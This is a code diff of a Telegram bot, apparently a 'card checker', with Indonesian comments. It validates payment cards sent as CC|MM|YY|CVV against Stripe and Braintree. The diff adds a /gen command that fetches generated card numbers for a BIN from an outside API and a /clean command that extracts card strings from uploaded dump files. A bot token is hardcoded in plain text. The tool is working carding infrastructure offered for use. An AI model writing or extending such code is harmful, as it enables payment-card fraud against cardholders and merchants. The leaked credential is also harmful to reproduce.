@@ -8,7 +8,9 @@ from html import unescape
 from bs4 import BeautifulSoup
 
 import httpx
+import requests
 from telegram import Update
+from telegram.constants import ParseMode
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -33,6 +35,8 @@ def save_admin_chat_ids(admins: set[int]) -> None:
 
 admin_chat_ids = get_admin_chat_ids()
 active_mode_per_chat = {}
+
+# ---------------------- STRIPE AUTH ----------------------
 
 class StripeAuth:
     @staticmethod
@@ -260,7 +264,7 @@ class StripeAuth:
         chat_id = update.effective_chat.id
         active_mode_per_chat[chat_id] = 'stripe'
         await update.message.reply_text(
-            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARD IN FORMAT ➯ CC|MM|YY|CVV"
+            "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
         )
 
     @staticmethod
@@ -307,6 +311,8 @@ class StripeAuth:
         admin_chat_ids.remove(remove_admin_id)
         save_admin_chat_ids(admin_chat_ids)
         await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")
+
+# ---------------------- BRAINTREE AUTH ----------------------
 
 class BraintreeAuth:
     @staticmethod
@@ -607,7 +613,7 @@ class BraintreeAuth:
         chat_id = update.effective_chat.id
         active_mode_per_chat[chat_id] = 'braintree'
         await update.message.reply_text(
-            "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARD IN FORMAT ➯ CC|MM|YY|CVV"
+            "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
         )
 
     @staticmethod
@@ -655,6 +661,8 @@ class BraintreeAuth:
         save_admin_chat_ids(admin_chat_ids)
         await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")
 
+# ---------------------- HANDLER CC MESSAGE ----------------------
+
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     if chat_id not in admin_chat_ids:
@@ -674,13 +682,16 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 raw_cards.append(part.strip())
 
     if not raw_cards:
-        await update.message.reply_text("NO CARD DATA FOUND IN MESSAGE.")
+        await update.message.reply_text("NO CARDS DATA FOUND IN MESSAGE")
         return
 
-    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')
+    msg = await update.message.reply_text("PROCESSING YOUR CARDS, PLEASE WAIT...")
+
+    bar_length = 20
 
     try:
-        for fullz in raw_cards:
+        total = len(raw_cards)
+        for i, fullz in enumerate(raw_cards, start=1):
             parts = fullz.split("|")
             if len(parts) != 4:
                 await update.message.reply_text(
@@ -702,6 +713,16 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 await asyncio.sleep(20)
                 result = await BraintreeAuth.multi_checking(cc_formatted)
 
+            progress_percent = int((i / total) * 100)
+            full_blocks = int(bar_length * progress_percent // 100)
+            empty_blocks = bar_length - full_blocks
+            bar = "█" * full_blocks + "░" * empty_blocks
+
+            try:
+                await msg.edit_text(f"\n[{bar}] {progress_percent}%")
+            except Exception:
+                pass
+
             await update.message.reply_text(result, parse_mode='HTML')
 
         await msg.delete()
@@ -709,19 +730,131 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     except Exception as e:
         await update.message.reply_text(f"ERROR: {str(e)}")
 
+# ---------------------- CC GENERATOR (/gen) ----------------------
+
+TOKEN_BOT = "8112017304:AAF6h2ipESiCrTl94z5CApog_5ep-KPVglo"
+API_URL = "https://drlabapis.onrender.com/api/ccgenerator"
+
+def parse_input(input_text):
+    input_text = input_text.strip()
+    count = 10
+
+    parts_space = input_text.split()
+    if len(parts_space) > 1 and parts_space[-1].isdigit():
+        count = int(parts_space[-1])
+        input_text = " ".join(parts_space[:-1])
+
+    bin_input = input_text
+
+    return bin_input, count
+
+async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    if not args:
+        await update.message.reply_text("/gen 550230 5")
+        return
+
+    bin_param = args[0]
+    count = 10
+    if len(args) > 1 and args[1].isdigit():
+        count = int(args[1])
+
+    params = {"bin": bin_param, "count": count}
+
+    try:
+        r = requests.get(API_URL, params=params)
+        if r.status_code == 200:
+            raw_ccs = r.text.strip().split('\n')
+
+            message_lines = ["🃏 CREDIT CARD GENERATOR 🃏\n"]
+            message_lines.append("```")
+            message_lines.extend(raw_ccs)
+            message_lines.append("```")
+
+            message = "\n".join(message_lines)
+            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+
+        else:
+            await update.message.reply_text(
+                f"❌ Gagal mendapatkan data dari API. Status code: {r.status_code}"
+            )
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ Terjadi kesalahan: {str(e)}")
+
+async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await ccgen_advanced(update, context)
+
+# ---------------------- CC CLEANER (/clean) ----------------------
+
+def extract_cc_from_line(line):
+    pattern = re.compile(
+        r"(\d{15,16})\|"
+        r"(0?[1-9]|1[0-2])\|"
+        r"(\d{2}|\d{4})\|"
+        r"(\d{3,4})"
+    )
+    return [match.group(0) for match in pattern.finditer(line)]
+
+def extract_cc_from_file(input_file, output_file):
+    results = []
+    with open(input_file, "r", encoding="utf-8") as f:
+        for line in f:
+            line = line.strip()
+            results.extend(extract_cc_from_line(line))
+
+    with open(output_file, "w", encoding="utf-8") as f:
+        for item in results:
+            f.write(item + "\n")
+    return len(results)
+
+async def start_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("HELLO! SEND THE FILE TO BE PROCESSED")
+
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    file = update.message.document
+    os.makedirs("downloads", exist_ok=True)
+    file_path = f"downloads/{file.file_name}"
+    new_file = await file.get_file()
+    await new_file.download_to_drive(custom_path=file_path)
+
+    os.makedirs("outputs", exist_ok=True)
+    output_path = f"outputs/clean_{file.file_name}"
+    count = extract_cc_from_file(file_path, output_path)
+
+    if count > 0:
+        await context.bot.send_document(chat_id=update.message.chat.id, document=open(output_path, 'rb'))
+        await update.message.reply_text(f"{count} CARDS HAVE BEEN SUCCESSFULLY EXTRACTED AND SENT")
+    else:
+        await update.message.reply_text("NO MATCHING CARDS DATA FOUND")
+
+async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("SEND THE FILE TO BE PROCESSED")
+
+# ---------------------- MAIN SCRIPT ----------------------
 
 if __name__ == "__main__":
     import sys
-    application = ApplicationBuilder().token("8112017304:AAF6h2ipESiCrTl94z5CApog_5ep-KPVglo").build()
+    application = ApplicationBuilder().token(TOKEN_BOT).build()
 
+    # Command untuk stripe auth
     application.add_handler(CommandHandler("sa", StripeAuth.start_stripe))
+    # Command untuk braintree auth
     application.add_handler(CommandHandler("ba", BraintreeAuth.start_braintree))
+    # Command untuk cc generator
+    application.add_handler(CommandHandler("gen", ccgen_advanced))
+    # Command untuk cc cleaner
+    application.add_handler(CommandHandler("clean", clean_command))
 
+    # Command admin
     application.add_handler(CommandHandler("addadmin_sa", StripeAuth.addadmin))
     application.add_handler(CommandHandler("deladmin_sa", StripeAuth.deladmin))
     application.add_handler(CommandHandler("addadmin_ba", BraintreeAuth.addadmin))
     application.add_handler(CommandHandler("deladmin_ba", BraintreeAuth.deladmin))
 
+    # Handler file untuk cleaner menerima file upload
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+
+    # Handler pesan kartu cc untuk auth
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
 
     print("PARAEL CHECKER BOT RUNNING 🔥")
